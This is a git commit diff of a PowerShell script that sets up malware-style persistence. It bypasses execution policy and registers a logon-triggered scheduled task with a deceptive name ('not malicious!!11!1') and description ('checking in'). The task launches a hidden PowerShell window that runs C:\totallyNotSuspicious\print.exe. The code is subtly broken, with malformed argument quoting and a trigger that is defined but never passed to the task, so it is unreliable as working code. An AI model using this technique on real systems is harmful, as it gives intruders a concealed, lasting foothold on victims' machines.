eb474d91ef6a360e737430530967da18ad380e54
Acrasy <sai.whocares@gmail.com>
2019-10-17 00:31:20 +0200

    persistence finished

--- codesamples/initialize/code/persitence.ps1
+++ codesamples/initialize/code/persitence.ps1
@@ -1,10 +1,11 @@
 $whoami=whoami.exe
 Set-ExecutionPolicy Bypass -Scope Process -Force;
 
-$A = New-ScheduledTaskAction New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -File" "C:\totallyNotSuspicious\print.exe"
-$T = New-ScheduledTaskTrigger -AtLogon
-$P = New-ScheduledTaskPrincipal $whoami
-$N = "print2Desktop"
-$D= New-ScheduledTask -Action $A -Trigger $T -Settings $S -Principal $P
+$whoami=whoami.exe
+$taskname = "not malicious!!11!1"
+$taskdescription = "checking in"
+$P = New-ScheduledTaskPrincipal -UserID $whoami -RunLevel Limited
+$A = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden  -File ""C:\totallyNotSuspicious\print.exe"
+$trigger =  New-ScheduledTaskTrigger -AtLogon
 
-Register-ScheduledTask  -InputObject $D -TaskName $N
+Register-ScheduledTask -Action $A  -Principal $P -TaskName $taskname -Description $taskdescription
